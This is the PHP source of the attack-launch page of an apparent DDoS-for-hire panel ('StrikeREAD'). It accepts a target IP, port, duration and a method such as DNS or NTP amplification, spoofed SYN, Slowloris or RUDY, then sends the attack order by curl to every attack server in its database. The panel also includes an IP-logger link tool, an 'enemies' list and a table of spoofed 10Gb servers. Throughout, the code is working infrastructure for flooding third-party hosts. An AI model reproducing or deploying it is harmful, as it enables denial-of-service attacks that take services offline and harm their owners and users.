<?php
ob_start();
error_reporting(0);
require_once 'includes/db.php';
require_once 'includes/init.php';
if (!($user -> LoggedIn()))
{
	header('location: login.php');
	die();
}
if (!($user -> notBanned($odb)))
{
	header('location: login.php');
	die();
}
?>
<!DOCTYPE html>
<html lang="en">
    
<head>        
        <title>StrikeREAD - DDOS</title>    

        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />

        <link href="css/styles.css" rel="stylesheet" type="text/css" />
        <!--[if lt IE 10]><link rel="stylesheet" type="text/css" href="css/ie.css"/><![endif]-->
        
        <script type="text/javascript" src="js/plugins/jquery/jquery.min.js"></script>
        <script type="text/javascript" src="js/plugins/jquery/jquery-ui.min.js"></script>
        <script type="text/javascript" src="js/plugins/bootstrap/bootstrap.min.js"></script>
        <script type="text/javascript" src="js/plugins/mcustomscrollbar/jquery.mCustomScrollbar.min.js"></script>
		<script type="text/javascript" src="js/plugins/sparkline/jquery.sparkline.min.js"></script>   
        <script type='text/javascript' src='js/plugins/knob/jquery.knob.js'></script>  
        <script type="text/javascript" src="js/plugins.js"></script>
        <script type="text/javascript" src="js/actions.js"></script>  
        
    </head>
    <body>
        
        <div class="page-container">
            
            <?php
	include("head.php");
	include("sidebar.php");
?>
<div class="page-content">
<div class="container">
<div class="page-toolbar">
<div class="page-toolbar-block">
<div class="page-toolbar-title">Hub</div>
<div class="page-toolbar-subtitle">Launch and Manage Attacks</div>
</div>
<div class="page-toolbar-block pull-right">
<div class="widget-info widget-from">
<button data-toggle="modal" data-target="#modal-example-1" class="btn btn-primary"><i class="fa fa-cog"></i> Tools</button>
<button data-toggle="modal" data-target="#modal-example-2" class="btn btn-error"><i class="fa fa-download"></i> Servers</button>
</div>
</div>
<ul class="breadcrumb">
<li><a href="index.php">STRIKEREAD</a></li>
<li class="active">Hub</li>
</ul>
<div id="div" style="display:inline"></div>
</div>
<div class="row">
<div class="col-md-5">
<form method="POST">
<?php
											if(isset($_POST['attackBtn'])){
												$host = $_POST['host'];
												$port = intval($_POST['port']);
												$time = intval($_POST['time']);
												$method = $_POST['method'];
												if(empty($host) || empty($time) || empty($port) || empty($method)){
													echo $design->alert('danger', 'Error', 'Please Fill In All Fields!');
												} elseif($time < 1) {
													echo $design->alert('danger', 'Error', 'Attack Time Must Be 1 or Greater!');
												} elseif(!isset($_POST['tos'])){
													echo $design->alert('danger', 'Error', 'You Must Agree To The Terms of Service!');
												} else {
													if(!filter_var($host, FILTER_VALIDATE_IP)){
														echo $design->alert('danger', 'Error', 'Invalid Host!');
													} else {
														$SQLCheckBlacklist = $odb->prepare("SELECT COUNT(*) FROM `blacklist` WHERE `IP` = :host");
														$SQLCheckBlacklist->execute(array(':host' => $host));
														$countBlacklist = $SQLCheckBlacklist -> fetchColumn(0);
														if($countBlacklist > 0){
															echo $design->alert('danger', 'Error', 'This Host Has Been Blacklisted!');
														} else {
															$checkRunningSQL = $odb->prepare("SELECT COUNT(*) FROM `logs` WHERE `user` = :username  AND `time` + `date` > UNIX_TIMESTAMP()");
															$checkRunningSQL->execute(array(':username' => $_SESSION['username']));
															$countRunning = $checkRunningSQL -> fetchColumn(0);
															if($countRunning == 0){
																$SQLGetTime = $odb->prepare("SELECT `plans`.`mbt` FROM `plans` LEFT JOIN `users` ON `users`.`membership` = `plans`.`ID` WHERE `users`.`ID` = :id");
																$SQLGetTime->execute(array(':id' => $_SESSION['ID']));
																$maxTime = $SQLGetTime -> fetchColumn(0);
																if(!($time > $maxTime)){
																	$insertLogSQL = $odb ->prepare("INSERT INTO `logs` VALUES(:user, :ip, :port, :time, :method, UNIX_TIMESTAMP())");
																	$insertLogSQL->execute(array(':user' => $_SESSION['username'], ':ip' => $host, ':port' => $port, ':time' => $time, ':method' => $method));
																	echo $design->alert('success', 'Success', 'Attack has been started on '.$host.':'.$port.' for '.$time.' seconds using '.$method.'!');
																	$sql = $odb->prepare("SELECT * FROM `servers");
																	$sql->execute();
																	while($r = $sql->fetch()){
																		$url = $r["url"]."&ip={$host}&port={$port}&time={$time}";
																		$ch = curl_init();
																		curl_setopt($ch, CURLOPT_URL, $url);
																		curl_setopt($ch, CURLOPT_HEADER, 0);
																		curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
																		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
																		curl_setopt($ch, CURLOPT_TIMEOUT, 1);
																		curl_exec($ch);
																		curl_close($ch);
																	}
																} else {
																	echo $design->alert('danger', 'Error', 'Your Maximum Attack time is '.$maxTime.'!');
																}
															} else {
																echo $design->alert('danger', 'Error', 'You Currently Have An Attack Running!');
															}
														}
													}
												}
											}
										?>
<div class="block">
<div class="block-content">
<h2><strong>Launch</strong> Attack <img id="image" src="img/ajax-loader.gif" style="display:none"/></h2>
</div>
<div class="block-content controls">
<div class="row-form">
<div class="col-md-2"><strong>Host:</strong></div>
<div class="col-md-7"><input type="text" id="host" name="host" class="form-control" placeholder="localhost.com / 127.0.0.1" /></div>
<div class="col-md-1"><strong>Port:</strong></div>
<div class="col-md-2"><input type="text" id="port" name="port" class="form-control" placeholder="80"/></div>
</div>
<div class="row-form">
<div class="col-md-2"><strong>Seconds:</strong></div>
<div class="col-md-2"><input type="text" id="time" name="time"  placeholder="60" class="form-control"/></div>
</div>
<div class="row-form">
<div class="col-md-2"><strong>Method:</strong></div>
<div class="col-md-5">
<select id="method" class="form-control" name="method" >
<optgroup label="Layer4 Attacks">
<option value="ssdp">SSDP</option>
<option value="udp">DNS Amplification</option>
<option value="ntp">NTP Amplifcation</option>
<option value="ssyn">Spoofed SYN</option>
<option value="essyn">Enhanced Spoofed SYN</option>
<option value="xsyn">X-SYN</option>
<option value="tcp">TCP Amplification</option> </optgroup>
<optgroup label="Layer7 Attacks">
<option value="httpget">HTTP-GET</option>
<option value="httppost">HTTP-POST</option>
<option value="httphead">HTTP-HEAD</option>
<option value="rudy">R-U-DEAD-YET? (rudy)</option>
<option value="arme">A.R.M.E</option>
<option value="slow">Slowloris</option>
<option value="source">Source HEAD</option>
<option value="joomla">Joomla Reflection</option> 
</optgroup>
</select>
</div>
</div>
<center><button id="launch" type="submit" name="attackBtn" class="btn btn-success">Launch</button> <div class="checkbox">
											<label>
												<input name="tos" type="checkbox" value="Terms of Service"/> I Agree To The <a href="tos.php">Terms of Service</a>
											</label>
										</div></center>
</div>
</div>
</form>
</div>
<div class="col-md-7">
<div class="block">
<div class="block-content">
<h2><strong>Last</strong> Attacks <img id="attacksimage" src="img/ajax-loader.gif" style="display:none"></h2>
</div>
<div id="attacksdiv" style="display:inline-block;width:100%">              <table class="table table-striped">
                <thead>
                  <tr>
																		<th>User</th>
																		<th>IP</th>
																		<th>Port</th>																		
																		<th>Method</th>
																		<th>Time</th>
																		<th>Date</th>
																		<th>Renew</th>
                  </tr>
                </thead>
                <tbody>
				  <?php
																	$attackLogs = $odb->prepare("SELECT * FROM `logs` WHERE `user` = :username ORDER BY `date` DESC");
																	$attackLogs->execute(array(':username' => $_SESSION['username']));
																	while($getInfo = $attackLogs -> fetch(PDO::FETCH_ASSOC)){
																		$user = $getInfo['user'];
																		$IP = $getInfo['ip'];
																		$port = $getInfo['port'];
																		$method = $getInfo['method'];
																		$time = $getInfo['time'];
																		$date = date("m-d-Y, h:i:s a" ,$getInfo['date']);
					?>
				  <tr>
																		<td><?php echo $user; ?> </td>
																		<td><?php echo $IP; ?></td>
																		<td><?php echo $port; ?></td>
																		<td><?php echo $method; ?></td>
																		<td><?php echo $time; ?></td>														
																		<td><?php echo $date; ?></td>
																		<td><button type="button" id="rere" class="btn btn-success"><i class="fa fa-refresh"></i> Renew</button></td>
																	</tr>
																<?php
																	}
																?>
              </tbody>
			  </table>
</div>
</div>
</div>
<div class="col-md-7">
<div class="block">
<div class="block-content">
<h2><strong>Last</strong> Attack <img id="attacksimage" src="img/ajax-loader.gif" style="display:none"></h2>
</div>
<div id="attacksdiv" style="display:inline-block;width:100%">              <table class="table table-striped">
                <thead>
                  <tr>
																		<th>IP</th>
																		<th>Port</th>
																		<th>Time</th>
																		<th>Method</th>
																		<th>Date</th>
																		<th>Stop</th>
                  </tr>
                </thead>
                <tbody>
				  <tr>
																		<?php
				$SQLGetLogs = $odb -> query("SELECT * FROM `logs` WHERE user='{$_SESSION['username']}' ORDER BY `date` DESC LIMIT 0, 1");
				while($getInfo = $SQLGetLogs -> fetch(PDO::FETCH_ASSOC))
				{
					$IP = $getInfo['ip'];
					$port = $getInfo['port'];
					$time = $getInfo['time'];
					$method = $getInfo['method'];
					$date = date("m-d-Y, h:i:s a" ,$getInfo['date']);
				}
					
				?>
																		<td><?php echo $IP; ?></td>
																		<td><?php echo $port; ?></td>
																		<td><?php echo $method; ?></td>
																		<td><?php echo $time; ?></td>														
																		<td><?php echo $date; ?></td>
																		<td><button type="button" onclick="www.google.es" id="st" class="btn btn-danger"><i class="fa fa-power-off"></i> Stop</button></td>
																		</tr>
				
              </tbody>
			  </table>
</div>
</div>
</div>
</div>
</div>
<div class="page-sidebar"></div>
</div>
<div class="modal fade" id="modal-example-1" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog">
<div class="modal-content">
<div class="modal-header">
<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
<h4 class="modal-title" id="myModalLabel">Tools</h4>
</div>
<div class="modal-body">
<div class="block nav-tabs-vertical">
<ul class="nav nav-tabs">
<li class="active"><a href="#tab1" data-toggle="tab">Resolvers</a></li>
<li><a href="#tab2" data-toggle="tab">IP Logger</a></li>
<li><a href="#tab3" data-toggle="tab">Friends & Enemies</a></li>
</ul>
<div class="block-content tab-content">
<div class="tab-pane active" id="tab1">
<p>
<div class="col-md-12">
<div class="input-group">
<input type="text" id="resolve" class="form-control">
<div class="input-group-btn">
<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">Choose Resolver <span class="caret"></span></button>
<ul class="dropdown-menu pull-right">
<li><a onclick="resolve('cloudflare')" href="#">Cloudflare</a></li>
<li><a onclick="resolve('domainn')" href="#">Domain</a></li>
<li><a onclick="resolve('skype')" href="#">Skype</a></li>
<li class="divider"></li>
<li><a onclick="resolve('ping')" href="#">Ping</a></li>
<li><a onclick="resolve('geo')" href="#">Get Location</a></li>
</ul>
</div>
</div>
</div>
<br>
<br>
<img id="resolveimage" src="img/ajax-loader.gif" style="display:none"/><div id="resolvediv" style="display:inline"></div>
<br><br>
</p>
</div>
<div class="tab-pane" id="tab2">
<p>
Your Link: <strong><input type="text" class="form-control" name="yourLink" placeholder="<?php echo $url.'funny.php?id='.$_SESSION['ID'];?>" value="<?php echo $url.'funny.php?id='.$_SESSION['ID'];?>" disabled readonly/></strong> 
<br>
<div class="block-content">
<h3>Logs</h3>
<form method="POST">
										<?php
											if(isset($_POST['deleteBtn'])){
												$SQL = $odb->prepare("DELETE FROM `iplogs` WHERE `userID` = :uid LIMIT 1");
												$SQL->execute(array(':uid' => $_SESSION['ID']));
												echo $design->alert('success', 'Success', 'IP(s) Have Been Removed!');
											}
										?>
										<div class="table-responsive">
											<table class="table table-striped table-bordered table-hover table-green" id="example">
												<thead>
													<tr>
														<th>Logged IP</th>
														<th>Date</th>
													</tr>
												</thead>
												<tbody>
													<?php
														$ipLogger = $odb->prepare("SELECT * FROM `iplogs` WHERE `userID` = :id ORDER BY `date` DESC");
														$ipLogger->execute(array(':id' => $_SESSION['ID']));
														while($getInfo = $ipLogger->fetch(PDO::FETCH_ASSOC)){
															$loggedIP = $getInfo['logged'];
															$date = date("m-d-Y, h:i:s a" ,$getInfo['date']);
													?>
													<tr>
														<td><?php echo $loggedIP; ?></td>
														<td><?php echo $date; ?></td>
													</tr>
												<?php
													}
												?>
												</tbody>
											</table>
											<button type="submit" name="deleteBtn" class="btn btn-danger">Delete</button>
										</div>
									</form>					
</div>
<br>
</p>
</div>
<div class="tab-pane" id="tab3">
<p>
<form method="POST">
										<?php 
											if(isset($_POST['addBtn'])){
												$ipAdd = $_POST['ipAdd'];
												$noteAdd = $_POST['noteAdd'];
												$type = $_POST['type'];
												if(empty($ipAdd) || empty($type)){
													echo $design->alert('danger', 'Error', 'Please Fill In All The Fields!');
												} else {
													if (!filter_var($ipAdd, FILTER_VALIDATE_IP)){
														echo $design->alert('danger', 'Error', ' The Given IP Address Was Invalid!');
													} else {
														$SQLinsert = $odb->prepare("INSERT INTO `fe` VALUES(NULL, :userID, :type, :ip, :note)");
														$SQLinsert->execute(array(':userID' => $_SESSION['ID'], ':type' => $type, ':ip' => $ipAdd, ':note' => $noteAdd));
														echo $design->alert('success', 'Success', 'Success :</strong> Successfully Stored!');
													}
												}
											}
										?>
										<div class="form-group">
											<label>IP Address</label>
											<input type="text" class="form-control" name="ipAdd" placeholder="IP Address Here!"/>
										</div>
										<div class="form-group">
											<label>Reason</label>
											<textarea class="form-control" name="noteAdd" placeholder="Reason Here!" rows="12"></textarea>
										</div>
										<div class="form-group">
											<label>Method</label>
											<select class="form-control" name="type">
												<option value="f" selected="selected">Friend</option>
												<option value="e">Enemy</option>
											</select>
										</div>
										<button type="submit" name="addBtn" class="btn btn-success">Add</button>
									</form>
									<form method="POST">
										<?php
											if(isset($_POST['deleteBtn'])){
												if(empty($_POST['deleteCheck'])){
													echo $design->alert('danger', 'Error', 'Nothing Is Checked!');
												} else {
													$deletes = $_POST['deleteCheck'];
													if(!empty($deletes)){
														foreach($deletes as $delete){
															$SQL = $odb->prepare("DELETE FROM `fe` WHERE `ID` = :id AND `userID` = :uid LIMIT 1");
															$SQL->execute(array(':id' => $delete, ':uid' => $_SESSION['ID']));
														}
														echo $design->alert('success', 'Success', 'IP(s) Have Been Removed!');
													}
												}
											}
										?>
										<div class="table-responsive">
											<table class="table table-striped table-bordered table-hover table-green" id="example">
												<thead>
													<tr>
														<th>Checkbox</th>
														<th>IP</th>
														<th>Type</th>
														<th>Note</th>
													</tr>
												</thead>
												<tbody>
													<?php
														$feLogs = $odb -> prepare("SELECT * FROM `fe` WHERE `userID` = :user ORDER BY `ID` DESC");
														$feLogs -> execute(array(':user' => $_SESSION['ID']));
														while($show = $feLogs -> fetch(PDO::FETCH_ASSOC)){
															$ipShow = $show['ip'];
															$noteShow = $show['note'];
															$rowID = $show['ID'];
															$type = ($show['type'] == 'f') ? 'Friend' : 'Enemy';
													?>
													<tr>
														<td><input type="checkbox" name="deleteCheck[]" value="<?php echo $rowID; ?>"/></td>
														<td><?php echo $ipShow; ?></td>
														<td><?php echo htmlentities($noteShow); ?></td>
														<td><?php echo $type; ?></td>
													</tr>
												<?php
													}
												?>
												</tbody>
											</table>
											<button type="submit" name="deleteBtn" class="btn btn-danger">Delete</button>
										</div>
									</form>
</tbody>
</table>
<br>
</p>
</div>
</div>
</div>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-error" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<div class="modal fade" id="modal-example-2" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog">
<div class="modal-content">
<div class="modal-header">
<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
<h4 class="modal-title" id="myModalLabel">Servers Stats</h4>
</div>
<div class="modal-body">
<table class="table table-striped">
<thead>
<tr>
<th><center>Name</center></th>
<th><center>Status</center></th>
<th><center>Power</center></th>
<th><center>Load</center></th>
<th><center>Type</center></th>
</tr>
</thead>
<tbody>
<tr>
<td><center>ServerUSA</center></td>
<td><center><b><font color="green">Online</font></b></center></td>
<td><center>10Gb</center></td>
<td><center>100%</center></td>
<td><center><b><font color="red">Spoofed</font></b></center></td>
</tbody>
<tbody>
<p>&nbsp;</p>
<td><center>ServerESP</center></td>
<td><center><b><font color="green">Online</font></b></center></td>
<td><center>10Gb</center></td>
<td><center>50%</center></td>
<td><center><b><font color="red">Spoofed</font></b></center></td>
</tbody>
</tr>
</table> </div>
<div class="modal-footer">
<button type="button" class="btn btn-error" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
</body>
</html>